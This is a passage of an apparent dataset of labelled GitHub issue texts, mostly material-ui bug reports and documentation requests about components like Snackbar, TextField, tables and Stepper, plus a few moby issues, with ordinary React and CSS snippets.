the snackbar.\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nIconButton's alignment is not appearing in the baseline to message content. It is appearing below the message content on the right side of snackbar.\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://codesandbox.io/s/9k80qnpj4\r\n\r\n1. Use the snackbar component with IconButton.\r\n2. Click the button to open the snackbar.\r\n3. Give fixed width and height. Say width: 24px and height: 24px.\r\n4. You will see the IconButton's alignment slightly below to the message content on the right side of snackabr.\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nIt looks abnormal with the alignment of the snackbar IconButton if fixed width and height is given. This issue appears even in the material-ui snackbar demo page.\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.1.0  |\r\n| React        | v16.5.2  |\r\n| Browser      | Google Chrome v69.0.3497.100  |\r\n<img width=\"394\" alt=\"screen shot 2018-09-22 at 7 37 08 pm\" src=\"https://user-images.githubusercontent.com/25824784/45918073-f50a4000-be9e-11e8-924e-231ba5b40af4.png\">\r\n\r\n"},{"labels":["documentation",null],"text":"https://github.com/mui-org/material-ui/blob/master/packages/material-ui/src/Input/Input.js#L1\r\n\r\nI believe this is a mistake?"},{"labels":[null,"documentation",null],"text":"I tried to change the color of Line Progress but not successful. Do you have a sample for it?"},{"labels":["documentation",null],"text":"- [x] This is a v1.x issue.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nJust want to start by saying I'm not a huge contributor to open source, so if this is a bad place to put this feel free to shout and I'll take it down.\r\n\r\nI was struggling with JSS for a number of reasons, so I decided to write a Webpack loader for loading external CSS files into JSS, specifically for use with Material UI. I really just want to share it in case it can be helpful to someone else who wants to keep their CSS in CSS but still use the Material UI theme. I doubt it has any room in the official Material UI repo, but who knows if it will spark any ideas.\r\n\r\nLink to loader: https://www.npmjs.com/package/css-to-mui-loader\r\n\r\n## Examples\r\n\r\nBasically, you can do things like this in your CSS:\r\n\r\n```css\r\n:root {\r\n  --xs-color: blue;\r\n}\r\n\r\n.button {\r\n  background: $(theme.palette.primary.main);\r\n  padding: 2su; /* Material UI spacing units */\r\n}\r\n \r\n.button:hover {\r\n  background: $(theme.palette.primary.light);\r\n}\r\n\r\n@media $(theme.breakpoints.only('xs')) {\r\n  .button {\r\n    background: var(--xs-color);\r\n    -mui-mixins: theme.mixins.button;\r\n  }\r\n}\r\n```\r\n\r\n...and then load it as you would an external JS file:\r\n\r\n```js\r\nimport Button from '@material-ui/core/Button';\r\nimport { withStyles } from '@material-ui/core/styles';\r\nimport styles from './styles.css';\r\n \r\nconst MyComponent = withStyles(styles)(({ classes }) => (\r\n  <Button className={classes.button}>\r\n    Click Me\r\n  </Button>\r\n));\r\n```\r\n\r\nUnder the hood it converts to something like this:\r\n\r\n```js\r\nexport default (theme) => {\r\n  const xsColor = `blue`;\r\n  return {\r\n    button: {\r\n      background: `${theme.palette.primary.main}`,\r\n      padding: `${theme.spacing.unit * 2}px`,\r\n      '&:hover': {\r\n        background: `${theme.palette.primary.light}`,\r\n      }\r\n    },\r\n    [theme.breakpoints.only('xs')]: {\r\n      button: {\r\n        ...theme.mixins.button,\r\n        background: `${xsColor}`,\r\n      }\r\n    }\r\n  };\r\n};\r\n```\r\n\r\n## Context\r\n\r\nI hoped to solve the following problems with this loader:\r\n- copy/paste CSS directly from Chrome inspector\r\n- make it easier for designers on the team to not have to work with JS\r\n- reduce verbosity of my style files\r\n- but still leverage the MUI theme and the power of scoped JSS\r\n\r\nAgain, happy to remove or move this issue if it's not helping anything, but also open to suggestions of where else to post this for others who may find it useful."},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nWhen you enter an invalid value into `TextField` of `type=\"number\"` the label should stay where it was - above the value.\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nAfter the input with an invalid value is blurred the label starts overlapping the value.\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://codesandbox.io/s/y0ykr6zo5z\r\n\r\n1. Remove the input value and blur the input; the label will descend into the input.\r\n2. Focus the input again and type the letter `e`.\r\n3. Blur again.\r\n4. See how the label descends, covering the just written `e`.\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nThe reason for this issue is that `input` with `type=\"number\"` will set its `value` field to an empty string if the entered value is invalid. The only way to distinguish that from an empty field is to check for the input `validity.badInput` field. See this example: https://jsfiddle.net/py7fbxtu/5/\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.0.1 & v1.4.3  |\r\n| React        | v16.3.2        |\r\n| Browser      | Chrome 68.0.3440.106        |\r\n| TypeScript   | N/A        |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null],"text":"I often wish the API docs would show the import paths at the top, like\r\n```js\r\nimport {ToggleButtonGroup} from '@material-ui/lab/ToggleButton'\r\n```\r\nBecause it would be faster than searching through the code examples in the demos for the paths."},{"labels":[null,null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nThe react-select example provided in the website is pushing the content down when the select is opened.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nContent bellow the select should be overlapped by the select.\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\nContent bellow the select is pushed down when the select is opened.\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://material-ui.com/demos/autocomplete/#react-select\r\n\r\n1. Click the select\r\n"},{"labels":[null,"documentation"],"text":"Many popular open-source projects let developers anticipate major releases by publishing a schedule in advance (e.g. https://symfony.com/roadmap). Material-ui doesn't publish such a schedule, and therefore major releases may come out of the blue (that's the case of the 3.0, totally unexpected, and breaking BC for what appears like a minor reason).\r\n\r\nAs far as I understand your release policy, previous minor releases are NOT maintained (or will they?). That means that users of material-ui will have to suffer the BC breaks if they want bug fixes.\r\n\r\nTo help us make the decision on when to start using material-ui (or even whether it makes sense to use it at all), the release schedule is a must. I, for one, can't work with a library breaking BC several times a year. So I'm very curious about your release policy. \r\n"},{"labels":["documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nA common pattern is to have a search field in the app bar, which expands when the search icon is clicked/touched. A demo of this pattern would be useful.\r\n\r\nSpec: https://material.io/design/navigation/search.html\r\n\r\n## Current Behavior\r\nCouldn't find such a demo at https://material-ui.com/demos/app-bar/, and the [blog layout example](https://material-ui.com/page-layout-examples/) has a dummy search button.\r\n\r\n## Examples\r\n* https://react-md.mlaursen.com/components/autocompletes#toolbar-search with autocomplete\r\n* https://material-ui.com/ itself showcases a search field in the app bar.\r\n* https://teamwertarbyte.github.io/material-ui-search-bar/"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nUsing the gatsby example during the developing phase (`gatsby develop`) and build (`gastby build`) i expect to have the same styling and functionnality.\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nOn develop everything works perfectly. On build everything is weird. i have different output when i refresh pages and it seems everything is messed up\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nI can't share the code right now in total. i can provide with files if needed. I used the gastby-ssr and withRoot and getPageContext of the example. \r\n\r\n#### Here are screenshot of things not working:\r\n\r\nIndex page\r\n![screenshot_2018-08-24 oasome blog](https://user-images.githubusercontent.com/3874836/44607989-86c85400-a7f2-11e8-9550-e4865afbebef.png)\r\nAnother page\r\n![screenshot_2018-08-24 oasome blog 1](https://user-images.githubusercontent.com/3874836/44607994-8a5bdb00-a7f2-11e8-9ee4-fa039704de58.png)\r\nSame page hitting a refresh\r\n![screenshot_2018-08-24 oasome blog 2](https://user-images.githubusercontent.com/3874836/44608010-96e03380-a7f2-11e8-9bc0-afb407af562a.png)\r\nGoing back to index\r\n![screenshot_2018-08-24 oasome blog 3](https://user-images.githubusercontent.com/3874836/44608028-a790a980-a7f2-11e8-9516-fbee7a988a91.png)\r\nRefreshing index again gives first photo\r\n\r\n#### How things are normally\r\n\r\n![screenshot_2018-08-24 oasome blog 4](https://user-images.githubusercontent.com/3874836/44608043-bd9e6a00-a7f2-11e8-83f4-b849939af421.png)\r\n![screenshot_2018-08-24 oasome blog 5](https://user-images.githubusercontent.com/3874836/44608052-c3944b00-a7f2-11e8-9dd0-795d3742626c.png)\r\n\r\n\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n```\r\n\"@material-ui/core\": \"^1.4.1\",\r\n\"@material-ui/icons\": \"^2.0.0\",\r\n\"classnames\": \"^2.2.6\",\r\n\"eslint\": \"^5.2.0\",\r\n\"eslint-config-airbnb\": \"^17.0.0\",\r\n\"eslint-plugin-import\": \"^2.13.0\",\r\n\"eslint-plugin-jsx-a11y\": \"^6.1.1\",\r\n\"gatsby\": \"next\",\r\n\"gatsby-image\": \"next\",\r\n\"gatsby-link\": \"^1.6.46\",\r\n\"gatsby-plugin-react-helmet\": \"next\",\r\n\"gatsby-plugin-sharp\": \"next\",\r\n\"gatsby-remark-copy-linked-files\": \"next\",\r\n\"gatsby-remark-images\": \"next\",\r\n\"gatsby-remark-smartypants\": \"^1.4.12\",\r\n\"gatsby-source-filesystem\": \"next\",\r\n\"gatsby-transformer-remark\": \"next\",\r\n\"gatsby-transformer-sharp\": \"next\",\r\n\"jss\": \"^9.8.7\",\r\n\"lodash\": \"^4.17.10\",\r\n\"mdi-material-ui\": \"^5.2.0\",\r\n\"prop-types\": \"^15.6.2\",\r\n\"react\": \"^16.4.1\",\r\n\"react-dom\": \"^16.4.1\",\r\n\"react-helmet\": \"^5.2.0\",\r\n\"react-images\": \"^0.5.19\",\r\n\"react-jss\": \"^8.6.1\",\r\n\"react-share\": \"^2.3.0\",\r\n\"react-simple-maps\": \"^0.12.1\",\r\n\"react-slick\": \"^0.23.1\"\r\n"},{"labels":[null,"documentation",null],"text":"## Expected Behavior\r\nWhen sorting a sort-able table, the rows should be able to be selected and associated with the correct row.\r\n\r\n## Current Behavior\r\nThe demo for sort-able tables works with the limited data provided, but not with a larger data set. It also seems to be when there are repeated values in a column.\r\n\r\n## Steps to Reproduce\r\n1. Go to: https://codesandbox.io/s/2z82p4nw0n\r\n2. Show the \"Current Module View\" to see the programmed table.\r\n3. Sort by Merchant Name and then select a few rows. The correct row will not be selected/deselected every time. If the correct rows are being selected, try sorting again and then selecting/deselecting some rows."},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nThe most of the functionality and demos in the documentation do not seem to work in IE11\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\nDialogs do not appear when buttons are clicked, root links do not action anything when clicked, expansion panels do not expand, drawers do not appear etc...\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\n1. https://material-ui.com/demos/dialogs/\r\n2. https://material-ui.com/demos/expansion-panels/\r\n3.https://material-ui.com/demos/drawers/\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v1.5.1  |\r\n| React        |      v 16.4.0   |\r\n| Browser      |      IE 11.0.9600   |\r\n| OS         |     Win7    |\r\n"},{"labels":[null,null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nIn the material-ui component demo for tables under \"Sorting and Selecting\", clicking to sort on Dessert column and then clicking on the name Kitkat, results in another row being selected, and KitKat changes to \"Nougat\".\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nSelecting a name like \"KitKat\" should select that row\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\n\"KitKat\" changes to Nougat and a different row is selected\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://material-ui.com/demos/tables/ under \"Sorting & Selecting\" or https://codesandbox.io/s/6vnol0pj2k\r\n\r\n1. Click to sort on the name column aka \"Dessert (100g serving)\" (See screenshot)\r\n\r\n![image](https://user-images.githubusercontent.com/1125565/44276010-e67b9980-a20b-11e8-9465-38414e77c1d6.png)\r\n\r\n2. Click on the second name \"KitKat\" to try to select that row\r\n3. Expected KitKat row to be selected. Got: KitKat changed to \"Nougat\" and 1 row is shown as selected, but not on the page. (See screenshot)\r\n\r\n![image](https://user-images.githubusercontent.com/1125565/44275913-ab796600-a20b-11e8-8a7b-a837a08f2373.png)\r\n\r\n\r\nLink:  https://github.com/mui-org/material-ui/blob/master/docs/src/pages/demos/tables/EnhancedTable.js\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment\r\n<!--- Include as many relevant details about the environment with which you experienced the bug. -->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v1.5.0  |\r\n| React        |         |\r\n| browser      |  Chrome   |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null],"text":"![screenshot_2018-08-11 screenshot from 2018-08-11 22-05-45 png png image 3840 x 2160 pixels 1](https://user-images.githubusercontent.com/28860670/43995229-17d7099a-9db3-11e8-830a-3e400d3ac110.png)\r\n\r\n\r\nhttps://streamable.com/6g15s\r\n\r\nhttps://material-ui.com/demos/tabs/#icon-tabs (zoom browser)"},{"labels":["documentation"],"text":"Hey everyone (awesome) at MUI!\r\n\r\nI just finished successfully troubleshooting a JSS styling issue largely in thanks to a lot of the existing discussion and [documentation provided in this repo](https://material-ui.com/getting-started/faq/#how-to-fix-a-class-names-conflict-in-production-).\r\n\r\nThere was one facet of my issue that wasn't covered however that I feel like the docs could be expanded which is to include a mention about the `runtimeChunk` option in WebPack.\r\n\r\nBriefly -- my scenario is that I'm producing a collection of components-per-chunk scripts that all rely on a common chunk.  All normal functionality in WebPack, but I realized that I was running the bootstrap stub multiple times.  Which of course for MUI meant I was getting multiple instances of the JSS css name generator (_oops!_).\r\n\r\nWhat I think would be great is to link to this page in the docs somewhere near the FAQ item I linked above: https://webpack.js.org/configuration/optimization/#optimization-runtimechunk\r\n\r\n"},{"labels":[null,"documentation"],"text":"The Stepper component appears to cause JSS to miscount class names in production, causing the UI to break. \r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x ] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nStepper renders properly when environment is set to 'development'.\r\n\r\n![image](https://user-images.githubusercontent.com/14338579/43789556-e536d590-9a35-11e8-8c61-1ebe31bc51d1.png)\r\n\r\n\r\n## Current Behavior\r\nStepper renders improperly when environment is set to 'production'. It renders a giant black svg circle with the stepper text below (which is now unformatted)\r\n\r\n![image](https://user-images.githubusercontent.com/14338579/43789940-d1363800-9a36-11e8-923a-e83071e084ad.png)\r\n\r\n\r\n\r\n## Steps to Reproduce\r\n\r\n1. Clone the ssr example from this repository.\r\n2. Create a Stepper component and import into App component (and removed other components).\r\n3. Changed the webpack.config.js mode from `mode: process.env.NODE_ENV || 'development',` to `mode: process.env.NODE_ENV || 'production',` and ran it.\r\n\r\nComponent.js\r\n``` javascript\r\n/*\r\n * Copyright (c) 2018, Critical Labs LLC\r\n ******************************************************************************/\r\nimport React from 'react';\r\nimport PropTypes from 'prop-types';\r\n\r\nimport Stepper from '@material-ui/core/Stepper';\r\nimport Step from '@material-ui/core/Step';\r\nimport StepLabel from '@material-ui/core/StepLabel';\r\nimport StepContent from '@material-ui/core/StepContent';\r\n\r\nclass Component extends React.Component {\r\n\r\n  constructor(props) {\r\n    super(props);\r\n    this.state = {\r\n      activeStep: 0,\r\n    };\r\n  }\r\n\r\n  render() {\r\n    return (\r\n      <div>\r\n        <Stepper orientation=\"vertical\" activeStep={this.state.activeStep}>\r\n          <Step>\r\n            <StepLabel>Test</StepLabel>\r\n            <StepContent>Hello World</StepContent>\r\n          </Step>\r\n        </Stepper>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Component;\r\n```\r\n\r\nApp.js\r\n```javascript\r\nimport React from 'react';\r\nimport PropTypes from 'prop-types';\r\nimport { withStyles } from '@material-ui/core/styles';\r\nimport Component from './Component.js';\r\n\r\nconst styles = theme => ({\r\n  root: {\r\n    backgroundColor: '#f00',\r\n  },\r\n});\r\n\r\nclass App extends React.Component {\r\n  render() {\r\n    const { classes } = this.props;\r\n\r\n    return (\r\n      <div className={classes.root}>\r\n        <Component/>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nApp.propTypes = {\r\n  classes: PropTypes.object.isRequired,\r\n};\r\n\r\nexport default withStyles(styles)(App);\r\n```\r\n\r\n## Context\r\nThis doesn't allow me to use the Stepper component in production. I may try to fallback to the v0 Stepper, as it works fine and I'm running both versions in parallel currently.\r\n\r\n## Your Environment\r\n<!--- Include as many relevant details about the environment with which you experienced the bug. -->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\nMaterial-UI | 1.4.2\r\nReact version | 16.4.1\r\nChrome version (build) | 67.0.3396.87\r\n"},{"labels":["documentation"],"text":"React material ui document site is down https://material-ui.com/ is down\r\n\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n https://material-ui.com/ should load without service worker\r\n\r\n## Current Behavior\r\n https://material-ui.com/ is not loading.\r\n"},{"labels":["documentation",null],"text":"Ever since version 2 of `@material-ui/icons` my live reloading is reaaaaaally slow (from less than a second to more than 5 seconds). The fix for this is to change how I import the icons:\r\n\r\nSlow:\r\n```js\r\nimport { Check } from '@material-ui/icons'\r\n```\r\n\r\nQuick:\r\n```js\r\nimport Check from '@material-ui/icons/Check'\r\n```\r\n\r\nI guess a quick fix would be to mention somewhere in the docs that destructured imports slow down live reloading in certain cases.\r\n\r\n(I've bootstrapped my project with `create-react-app`)\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nQuick live reloading (<1 second)\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nSlow live reloading (>5 seconds)\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nHere's the code that I changed that fixed this issue for me:\r\n\r\n(Slow live reloading)\r\n```js\r\nimport {\r\n  Check,\r\n  Close,\r\n  Info,\r\n  NavigateBefore,\r\n  NavigateNext,\r\n  Star,\r\n  StarBorder\r\n} from '@material-ui/icons'\r\n```\r\n\r\n(Quick live reloading)\r\n```js\r\nimport Check from '@material-ui/icons/Check'\r\nimport Close from '@material-ui/icons/Close'\r\nimport Info from '@material-ui/icons/Info'\r\nimport NavigateBefore from '@material-ui/icons/NavigateBefore'\r\nimport NavigateNext from '@material-ui/icons/NavigateNext'\r\nimport Star from '@material-ui/icons/Star'\r\nimport StarBorder from '@material-ui/icons/StarBorder'\r\n```\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nNow that I've figured out how to fix this it isn't really a problem for me. But others who don't know about this might be stuck trying to figure out why their live reloading is slow all of a sudden.\r\n\r\n## Your Environment\r\n<!--- Include as many relevant details about the environment with which you experienced the bug. -->\r\n\r\n| Tech               | Version             |\r\n|--------------------|---------------------|\r\n| @material-ui/core  | v1.4.3              |\r\n| @material-ui/icons | v2.0.1              |\r\n| React              | v16.4.2             |\r\n| react-scripts      | v1.1.4              |\r\n| Browser            | Chrome 68.0.3440.84 |\r\n"},{"labels":["documentation",null],"text":"I feel like the documentation for withTheme is pretty dry and would benefit from having a better description for what the feature does, what problems does it solve and would benefit from having an example code.\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is a v1.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n"},{"labels":[null,null,"documentation"],"text":"Hi, \r\n\r\nThe autosuggest at \r\nhttps://material-ui.com/demos/autocomplete/\r\n\r\nOverflows out of the screen when you select multiple countries on mobile, instead of expanding downwards.\r\n\r\nI'm not great at css, could someone perhaps suggest a solution to this? \r\n\r\nThanks\r\n"},{"labels":["documentation",null],"text":"**Description**\r\nI was visiting https://mobyproject.org/ and when I clicked github link it redirected to 404 Page Not found.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go to https://mobyproject.org/\r\n2.Click on Github Link\r\n\r\n**Describe the results you received:**\r\nIt redirected to `https://github.com/moby/moby/blob/moby/README.md` \r\n\r\n**Describe the results you expected:**\r\nI think it should be `https://github.com/moby/moby/` or to README page `https://github.com/moby/moby/blob/master/README.md`\r\n"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nThe SwarmJoin API supports `Availability` (https://github.com/moby/moby/blob/master/daemon/cluster/swarm.go#L147-L188), which the CLI client also uses, but it is not documented in the API docs (https://github.com/moby/moby/blob/master/api/swagger.yaml#L10008).\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide 